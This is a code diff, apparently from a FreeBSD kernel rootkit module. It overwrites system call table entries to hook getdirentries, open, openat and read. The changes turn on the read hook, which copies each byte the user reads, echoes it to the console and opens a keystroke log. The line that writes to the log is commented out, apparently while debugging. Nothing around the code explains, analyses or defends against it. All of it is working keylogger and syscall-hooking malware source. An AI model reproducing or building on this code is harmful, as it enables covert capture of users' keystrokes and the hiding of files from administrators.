@@ -48,7 +48,7 @@ int insert_hooks(void) {
 	sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
 	sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
 	sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
-	//sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
+	sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
 	return 0;
 }
 
@@ -57,7 +57,7 @@ int remove_hooks(void) {
 	sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 	sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
 	sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
-	//sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+	sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 	return 0;
 }
 
@@ -195,11 +195,16 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 	int testfd = 0;
 	copyinstr(uap->buf, buf, 1, &done);
 
-	//printf("woo\n", buf[0]);
+	
+
+	printf("%c", buf[0]);
 
 	filewriter_openlog(curthread, &testfd, KEYSTROKE);
-	filewriter_writelog(curthread, testfd, buf, 1);
+	//filewriter_writelog(curthread, testfd, buf, 1);
+
 	filewriter_closelog(curthread, testfd);
+	
+	
 
 
 	
